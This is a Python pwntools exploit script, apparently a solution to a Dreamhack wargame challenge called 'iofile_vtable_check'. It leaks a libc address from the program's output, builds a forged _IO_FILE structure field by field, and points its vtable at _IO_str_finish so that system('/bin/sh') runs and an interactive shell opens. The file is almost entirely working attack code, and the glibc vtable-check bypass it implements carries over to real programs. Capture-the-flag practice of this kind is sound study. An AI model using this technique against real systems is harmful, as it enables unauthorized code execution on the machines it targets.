from pwn import *

context.terminal = ['tmux', 'new-window']

success = lambda name, addr: log.success(f"{name}: {hex(addr)}")

env = {"LD_PRELOAD": "/home/hibrian827/Wargame/Dreamhack/Pwnable/iofile_vtable_check/problem/libc.so.6"}
rem = process("./Pwnable/iofile_vtable_check/problem/iofile_vtable_check", env=env)

elf = ELF("./Pwnable/iofile_vtable_check/problem/iofile_vtable_check")
lib = ELF("./Pwnable/iofile_vtable_check/problem/libc.so.6")

rem.recvuntil(b"stdout: ")
stdout_addr = int(rem.recvn(14).decode(), 16)
lib_base = stdout_addr - lib.symbols['_IO_2_1_stdout_']
success("lib base", lib_base)

ioFileJumps_addr = lib_base + lib.symbols['_IO_file_jumps']
ioStrFinish_addr = ioFileJumps_addr + 0xd0
sys_addr = lib_base + lib.symbols['system']
binsh_addr = lib_base + next(lib.search(b"/bin/sh"))
fp = elf.symbols['fp']

payload = p64(0)                        # 0x00-0x03 (nothing) + 0x04-0x07 int _flags;		/* High-order word is _IO_MAGIC; rest is flags. */
payload += p64(0)                       # 0x08-0x0f char *_IO_read_ptr;	/* Current read pointer */
payload += p64(0)                       # 0x10-0x17 char *_IO_read_end;	/* End of get area. */
payload += p64(0)                       # 0x18-0x1f char *_IO_read_base;	/* Start of putback+get area. */
payload += p64(0)                       # 0x20-0x28 char *_IO_write_base;	/* Start of put area. */
payload += p64(0)                       # 0x28-0x2f char *_IO_write_ptr;	/* Current put pointer. */
payload += p64(0)                       # 0x30-0x37 char *_IO_write_end;	/* End of put area. */
payload += p64(binsh_addr)              # 0x38-0x3f char *_IO_buf_base;	/* Start of reserve area. */
payload += p64(0)                       # 0x40-0x47 char *_IO_buf_end;	/* End of reserve area. */
payload += p64(0)                       # 0x48-0x4f char *_IO_save_base; /* Pointer to start of non-current get area. */
payload += p64(0)                       # 0x50-0x57 char *_IO_backup_base;  /* Pointer to first valid character of backup area */
payload += p64(0)                       # 0x58-0x5f char *_IO_save_end; /* Pointer to end of non-current get area. */
payload += p64(0)                       # 0x60-0x67 struct _IO_marker *_markers;
payload += p64(0)                       # 0x68-0x6f struct _IO_FILE *_chain;
payload += p64(0)                       # 0x70-0x73 int _flags2:24; + 0x74-0x77 int _fileno;
payload += p64(0)                       # 0x78-0x7f __off_t _old_offset; /* This used to be _offset but it's too small.  */
payload += p64(0)                       # 0x80-0x83 (nothing); + 0x84 char _shortbuf[1]; + 0x85 signed char _vtable_offset; + 0x86-0x87 unsigned short _cur_column; char _short_backupbuf[1];
payload += p64(fp + 0x10)               # 0x88-0x8f _IO_lock_t *_lock;
payload += p64(0)                       # 0x90-0x97 __off64_t _offset;
payload += p64(0)                       # 0x98-0x9f struct _IO_codecvt *_codecvt;
payload += p64(0)                       # 0xa0-0xa7 struct _IO_wide_data *_wide_data;
payload += p64(0)                       # 0xa8-0xaf struct _IO_FILE *_freeres_list;
payload += p64(0)                       # 0xb0-0xb7 void *_freeres_buf;
payload += p64(0)                       # 0xb8-0xbf struct _IO_FILE **_prevchain; (=__pad5)
payload += p64(0)                       # 0xc0-0xc3 char[] _unused2; + 0xc5-0xc7 int _mode;
payload += p64(0)                       # 0xc8-0xcf char[] _unused2;
payload += p64(0)                       # 0xd0-0xd7 char[] _unused2;

payload += p64(ioStrFinish_addr - 0x10) # 0xd8-0xdf _IO_file_jumps
payload += p64(0)                       # 0xe0-0xe7 fp->_s._allocate_buffer
payload += p64(sys_addr)                # 0xe8-0xef fp->_s._free_buffer

rem.sendlineafter(b"Data: ", payload)

rem.interactive()